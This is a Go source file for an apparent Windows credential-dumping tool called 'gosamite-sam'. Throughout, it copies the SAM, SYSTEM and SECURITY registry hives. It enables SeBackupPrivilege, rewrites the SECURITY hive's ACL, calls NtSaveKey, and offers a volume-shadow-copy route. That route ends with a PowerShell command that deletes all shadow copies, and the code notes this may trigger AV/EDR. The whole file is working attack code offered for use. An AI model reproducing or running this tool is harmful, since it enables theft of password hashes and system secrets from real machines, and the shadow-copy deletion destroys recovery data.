//go:build windows

package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"github.com/StackExchange/wmi"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type Win32_ShadowCopy struct {
	DeviceObject string
}

var (
	ntdll         = windows.NewLazyDLL("ntdll.dll")
	procNtSaveKey = ntdll.NewProc("NtSaveKey")

	advapi32                      = windows.NewLazyDLL("Advapi32.dll")
	procGetExplicitEntriesFromACL = advapi32.NewProc(
		"GetExplicitEntriesFromAclW",
	)
	procGetNamedSecurityInfo = advapi32.NewProc(
		"GetNamedSecurityInfoW",
	)
	procSetEntriesInACL = advapi32.NewProc(
		"SetEntriesInAclW",
	)
	procSetNamedSecurityInfo = advapi32.NewProc(
		"SetNamedSecurityInfoW",
	)

	hives     []string
	filenames []string

	success, getsec, clean, volumeshadowcopy, vsccreated bool
)

func adjusttokenprivs(
	token windows.Token,
	newState *windows.Tokenprivileges,
	newStateBuffer []byte,
) error {
	fmt.Println("[+] Adjusting privileges")
	err := windows.AdjustTokenPrivileges(
		token,
		false,
		newState,
		uint32(len(newStateBuffer)),
		nil,
		nil,
	)
	return err
}

// Function to check if volume shadow copy exists
// This was mostly taken from ChatGPT
func checkifvscexists() bool {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	// Create a COM object for the Shadow Copy Service
	unknown, err := oleutil.CreateObject(
		"WbemScripting.SWbemLocator",
	)
	if err != nil {
		fmt.Println("[!] Error creating SWbemLocator object:", err)
		return false
	}
	defer unknown.Release()

	// Get the IDispatch interface
	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		fmt.Println("[!] Error getting IDispatch interface:", err)
		return false
	}
	defer wmi.Release()

	// Call the ConnectServer method to connect to the WMI service
	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer")
	if err != nil {
		fmt.Println("[!] Error calling ConnectServer method:", err)
		return false
	}
	service := serviceRaw.ToIDispatch()
	defer service.Release()

	// Query for the Win32_ShadowCopy class
	query := "SELECT * FROM Win32_ShadowCopy"
	resultRaw, err := oleutil.CallMethod(service, "ExecQuery", query)
	if err != nil {
		fmt.Println("[!] Error calling ExecQuery method:", err)
		return false
	}
	result := resultRaw.ToIDispatch()
	defer result.Release()

	countVariant, err := oleutil.GetProperty(result, "Count")
	if err != nil {
		fmt.Println("[!] Error getting Count property:", err)
		return false
	}
	count := int(countVariant.Val)

	if count > 0 {
		fmt.Println("[+] At least one volume shadow copy exists")
		return true
	} else {
		fmt.Println("[+] No volume shadow copies found.")
		return false
	}

}

func cleanup() {
	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
	time.Sleep(10 * time.Second)
	fmt.Println("[+] Cleaning up")

	if success {
		fmt.Println("[+] Attempting to remove saved files")
		for _, f := range filenames {
			if _, err := os.Stat(f); err == nil {
				err = os.Remove(f)
				if err != nil {
					fmt.Printf("[-] Could not remove %s\n", f)
				} else {
					fmt.Printf("[+] Successfully removed %s\n", f)
				}
			}
		}
	} else {
		fmt.Println("[-] No files to clean up")
	}

	// disablepriv("SeBackupPrivilege")
}

func createnewstate(
	priv string,
	attributes uint32,
) (*windows.Tokenprivileges, []byte) {
	var luid windows.LUID

	// Get the LUID of the privilege
	err := windows.LookupPrivilegeValue(
		nil,
		windows.StringToUTF16Ptr(priv),
		&luid,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}

	newStateBuffer := make(
		[]byte,
		4+unsafe.Sizeof(windows.LUIDAndAttributes{}),
	)
	nsb0 := &newStateBuffer[0]
	newState := (*windows.Tokenprivileges)(unsafe.Pointer(nsb0))
	newState.PrivilegeCount = 1
	newState.Privileges[0].Luid = luid
	newState.Privileges[0].Attributes = attributes

	return newState, newStateBuffer
}

func createvsc() {
	_, e := wmi.CallMethod(
		nil,
		"Win32_ShadowCopy",
		"Create",
		[]interface{}{"C:\\"},
	)
	if e != nil {
		fmt.Printf("[!] Error creating volume shadow copy: %s", e)
		fmt.Printf("[!] Can't do it without the copy, exiting...")
		os.Exit(-1)
	}

	fmt.Println("[+] Volume shadow copy successfully created")
}

/*
Function to disable a privilege for cleanup
It's probably not needed, but leaving this in here
in case it's needed for future use
*/
/*
func disablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_REMOVED,
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}
}
*/

func deletevsc() {
	var cmd *exec.Cmd
	var e error
	fmt.Println("[+] Removing volume shadow copy")
	fmt.Println("[+] NOTE: this may be detected/blocked by AV/EDR")
	fmt.Println("[+] because it resembles ransomware behavior; ")
	fmt.Println("[+] manual removal may be required")
	cmd = exec.Command(
		"powershell.exe",
		"-c",
		"Get-CimInstance -ClassName Win32_ShadowCopy"+
			" | Remove-CimInstance",
	)
	e = cmd.Run()
	if e != nil {
		fmt.Printf(
			"[!] Unable to remove the volume shadow copy: %s\n",
			e,
		)
	} else {
		fmt.Println("[+] Successfully removed volume shadow copy")
	}
}

/*
Function to enable or disable a privilege for the current token
Ripped this off almost completely from:
https://github.com/golang/go/issues/64170
*/
func enablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Exiting...")
		os.Exit(1)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_ENABLED,
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Adjusting token privileges was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
}

func execute() {
	var oldentries []windows.EXPLICIT_ACCESS

	if volumeshadowcopy {
		vscsave()
	} else {
		fmt.Println("[+] Enabling SeBackupPrivilege")
		enablepriv("SeBackupPrivilege")

		if getsec {
			fmt.Println(
				"[+] Giving ourselves READ access " +
					"to the SECURITY hive.",
			)
			oldentries = getsecreadpermission()
		}

		fmt.Println("[+] Saving the hives")
		for i, h := range hives {
			outfile := filenames[i]
			savehive(h, outfile)
		}

		if getsec {
			// Restore the original ACL EXPLICIT_ACCESS entries
			revertsecpermissions(oldentries)
			defer windows.LocalFree(
				(windows.Handle)(unsafe.Pointer(&oldentries[0])),
			)
		}
	}

	fmt.Println("[+] Waiting 3 seconds before checking files...")
	time.Sleep(3 * time.Second)

	for _, f := range filenames {
		if _, err := os.Stat(f); err == nil {
			fmt.Printf("[+] %s exists, "+
				"hive was successfully copied\n", f)
			success = true
		}
	}
}

func getdeviceobject() string {
	var dst []Win32_ShadowCopy
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		fmt.Println("[!] Couldn't get DeviceObject")
		fmt.Println("[!] Can't do it without DeviceObject, exiting")
		os.Exit(-1)
	}
	fmt.Println("[+] Got the DeviceObect:")
	fmt.Printf("[+] %s\n", dst[0].DeviceObject)
	return dst[0].DeviceObject

}

func getproctoken() (windows.Token, error) {
	var token windows.Token

	fmt.Println("[+] Opening process token to adjust privileges")
	err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&token,
	)
	return token, err
}

// Function to give ourselves read permission to the SECURITY
// hive so that we can save a copy of it
func getsecreadpermission() []windows.EXPLICIT_ACCESS {
	var newacl, oldacl windows.Handle
	seckey := "MACHINE\\SECURITY"
	var oldentries []windows.EXPLICIT_ACCESS = make(
		[]windows.EXPLICIT_ACCESS,
		1,
	)
	var entry []windows.EXPLICIT_ACCESS

	// Uncomment the below if you would rather give the
	// permission to the current user, rather than the
	// local admins group
	/*
		CurrentUser, err := user.Current()
		if err != nil {
			fmt.Printf("[!] %s\n", err))
			fmt.Println("[!] Exiting...")
			os.Exit(1)
		}
	*/

	// Comment next 3 lines if you want current user instead
	var AdminGroupSidStr string = "S-1-5-32-544"
	var AdminGroupSid *windows.SID

	AdminGroupSid, _ = windows.StringToSid(AdminGroupSidStr)

	var secDesc windows.Handle

	fmt.Println("[+] " +
		"Getting old SECURITY ACL so it can be restored later")
	ret, _, err := procGetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION),
		0,
		0,
		uintptr(unsafe.Pointer(&oldacl)),
		0,
		uintptr(unsafe.Pointer(&secDesc)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Couldn't backup old ACL, exiting...")
		os.Exit(1)
	}

	defer windows.LocalFree(secDesc)

	var countentries int
	/*
		Get the individual EXPLICIT_ACCESS entries from the
		ACL, which we will need to restore the original ACL
		To be sure of the number of entries, we will call
		GetExplicitEntriesFromAcl twice - once to get the
		count of entries so we can properly initialize the
		old entries array, then a second time to actually
		get the array of entries
	*/
	fmt.Println("[+] Getting EXPLICIT_ACCESS entries from old ACL")
	ret, _, err = procGetExplicitEntriesFromACL.Call(
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&countentries)),
		uintptr(unsafe.Pointer(&oldentries)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Printf(
			"[!] Try again with an array of size %d\n",
			countentries,
		)
		fmt.Println("[!] Exiting...")
		os.Exit(1)
	}
	oldentries = make([]windows.EXPLICIT_ACCESS, countentries)
	ret, _, err = procGetExplicitEntriesFromACL.Call(
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&countentries)),
		uintptr(unsafe.Pointer(&oldentries)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Couldn't create ACL entries, exiting...")
		os.Exit(1)
	}

	// Sometimes running this gets wonky, so we will print the
	// access mask entries in case they're needed for debugging
	fmt.Println(
		"[+] Access mask values from EXPLICIT_ACCESS entries:",
	)
	for _, entry := range oldentries {
		fmt.Printf("[+] Access Mask: %d\n", entry.AccessPermissions)
	}

	fmt.Println("" +
		"[+] Creating a new EXPLICIT_ACCESS entry for READ access")
	ea := windows.EXPLICIT_ACCESS{
		AccessPermissions: windows.GENERIC_READ,
		AccessMode:        windows.GRANT_ACCESS,
		Inheritance:       windows.SUB_CONTAINERS_AND_OBJECTS_INHERIT,
		Trustee: windows.TRUSTEE{
			TrusteeForm: windows.TRUSTEE_IS_SID,
			TrusteeType: windows.TRUSTEE_IS_GROUP,
			// Change AdminGroupSid if using current user
			TrusteeValue: windows.TrusteeValueFromSID(AdminGroupSid),
		},
	}
	entry = []windows.EXPLICIT_ACCESS{ea}

	fmt.Println("[+] Creating modified ACL")
	ret, _, err = procSetEntriesInACL.Call(
		uintptr(len(entry)),
		uintptr(unsafe.Pointer(&entry[0])),
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&newacl)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't create the ACL, exiting...]")
		os.Exit(1)
	}

	defer windows.LocalFree(newacl)

	fmt.Println("[+] Applying new ACL to SECURITY")
	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
	ret, _, err = procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
		0,
		0,
		uintptr(newacl),
		0,
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't apply the ACL, exiting...]")
		os.Exit(1)
	}

	return oldentries
}

func main() {
	flag.Parse()
	if flag.NArg() == 0 {
		getsec = true
		hives = append(hives, "SYSTEM", "SECURITY", "SAM")
		filenames = append(
			filenames,
			"C:\\Windows\\Temp\\syscopy",
			"C:\\Windows\\Temp\\seccopy",
			"C:\\Windows\\Temp\\samcopy",
		)
	} else {
		for _, a := range flag.Args() {
			switch strings.ToUpper(a) {
			case "SAM":
				hives = append(hives, strings.ToUpper(a))
				filenames = append(
					filenames,
					"C:\\Windows\\Temp\\samcopy",
				)
			case "SYSTEM":
				hives = append(hives, strings.ToUpper(a))
				filenames = append(
					filenames,
					"C:\\Windows\\Temp\\syscopy",
				)
			case "SECURITY":
				getsec = true
				hives = append(hives, strings.ToUpper(a))
				filenames = append(
					filenames,
					"C:\\Windows\\Temp\\seccopy",
				)
			case "CLEAN":
				clean = true
			case "VSC":
				volumeshadowcopy = true
			default:
				fmt.Printf(
					"[!] Invalid argument: %s\n\n",
					a,
				)
				printusage()
				return
			}
		}
		if len(hives) == 0 {
			getsec = true
			hives = append(hives, "SYSTEM", "SECURITY", "SAM")
			filenames = append(
				filenames,
				"C:\\Windows\\Temp\\syscopy",
				"C:\\Windows\\Temp\\seccopy",
				"C:\\Windows\\Temp\\samcopy",
			)
		}
	}

	execute()
	if clean {
		cleanup()
	}

	if success {
		fmt.Println("[+] WOOOOOO! At least one hive was copied")
		fmt.Println("[+] Have a nice day")
		os.Exit(0)
	} else {
		fmt.Println("[-] Execution was blocked (or errored out)")
		fmt.Println("[+] Your day can only get better from here")
		os.Exit(1)

	}
}

func printusage() {
	fmt.Println("Usage:")
	fmt.Println("gosamite-sam [hives] [vsc] [clean]\n")
	fmt.Println("Options:")
	fmt.Println("hives (can be any subset in any order):")
	fmt.Println("    SYSTEM")
	fmt.Println("    SECURITY")
	fmt.Println("    SAM")
	fmt.Println("(Default: All 3, in the above order)")
	fmt.Println("vsc: use volume shadow copy instead of registry")
	fmt.Println(
		"clean: automatically remove any saved files " +
			"after a 10 second sleep",
	)
	fmt.Println("(copied files will be saved in C:\\Windows\\Temp)")
}

// Function to restore the original ACL of the SECURITY hive
func revertsecpermissions(oldentries []windows.EXPLICIT_ACCESS) {
	var newacl windows.Handle
	seckey := "MACHINE\\SECURITY"

	// The oldentries parameter should be an array of the
	// EXPLICIT_ACCESS entries from the original ACL
	// ret, _, err :=
	procSetEntriesInACL.Call(
		uintptr(len(oldentries)),
		uintptr(unsafe.Pointer(&oldentries[0])),
		0, // null for the old ACL, so it will create a new one
		uintptr(unsafe.Pointer(&newacl)),
	)
	// Commenting this out because sometimes ret would get
	// a non-zero even on success, and err would be "the
	// operation completed successfully"
	/*
		if ret != 0 {
			fmt.Printf("[!] %s\n", err)
			os.Exit(1)
		}
	*/

	defer windows.LocalFree(newacl)

	fmt.Println("[+] Applying old ACL to SECURITY")
	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
	ret, _, err := procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
		0,
		0,
		uintptr(newacl),
		0,
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't apply the old ACL...]")
		fmt.Println("[!] You may have to manually fix it")

	}
}

func savefromvsc(deviceobject string) {
	var srcpath, dstpath string
	var srcfile, dstfile *os.File
	var bufsize, bytesread int
	var buf []byte
	var err error

	for i, h := range hives {
		fmt.Printf("[+] Attempting to copy %s\n", h)
		srcpath = filepath.Join(
			deviceobject,
			"Windows",
			"System32",
			"config",
			h,
		)
		dstpath = filenames[i]

		srcfile, err = os.Open(srcpath)
		if err != nil {
			fmt.Printf("[!] Error opening %s\n", srcpath)
			fmt.Printf("[!] Skipping %s\n", h)
			continue
		}

		dstfile, err = os.Create(dstpath)
		if err != nil {
			fmt.Printf("[!] Error opening %s\n", dstpath)
			fmt.Println("[!] Can't write to Windows\\Temp, exiting")
			os.Exit(-1)
		}

		bufsize = 4096
		buf = make([]byte, bufsize)
		for {
			bytesread, err = srcfile.Read(buf)
			if err != nil && err.Error() != "EOF" {
				fmt.Printf("[!] Error reading from %s\n", srcpath)
				fmt.Printf("[!] %s", err)
				srcfile.Close()
				dstfile.Close()
				break
			}
			if bytesread == 0 {
				srcfile.Close()
				dstfile.Close()
				break
			}

			_, err = dstfile.Write(buf[:bytesread])
			if err != nil {
				fmt.Println("[!] Can't copy to Windows\\Temp, exiting")
				os.Exit(-1)
			}
		}
		fmt.Printf(
			"[+] Successfully copied %s from volume shadow copy "+
				"to Windows Temp folder\n",
			h,
		)
	}
}

// Function to save a hive to a specified outfile
func savehive(hive string, outfile string) {
	fmt.Printf("[+] Opening handle to %s\n", hive)
	k, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		hive,
		registry.QUERY_VALUE,
	)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Opening handle to hive was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}

	fmt.Printf("[+] Opening handle to %s\n", outfile)
	unifile, err := windows.UTF16PtrFromString(outfile)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Unexpected error, exiting...")
		os.Exit(1)
	}

	// The 4 passed as the fifth parameter is for OPEN_ALWAYS
	// from:
	// https://learn.microsoft.com/
	// en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
	fh, err := windows.CreateFile(
		unifile,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		4,
		0,
		0,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Error creating file, exiting...")
		os.Exit(1)
	}

	// NtSaveKey - sneaky, sneaky
	// Just pass the handle to the key, and handle to the file
	fmt.Println("[+] Saving hive to file.")
	stat, _, err := procNtSaveKey.Call(uintptr(k), uintptr(fh))
	if stat != 0 {
		fmt.Printf("[-] %s\n", err)
		fmt.Printf("[-] status returned is %0x\n", uintptr(stat))
		fmt.Println("[-] Saving hive to file was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
	defer windows.Close(fh)
}

func vscsave() {
	var vscexists bool
	var deviceobject string

	fmt.Println(
		"[+] Checking if a volume shadow copy already exists",
	)
	vscexists = checkifvscexists()

	if !vscexists {
		fmt.Println("[+] Creating volume shadow copy")
		vsccreated = true
		createvsc()
	}

	fmt.Println("[+] Getting DeviceObject of volume shadow copy")
	deviceobject = getdeviceobject()

	savefromvsc(deviceobject)

	if !vscexists {
		deletevsc()
	}

}
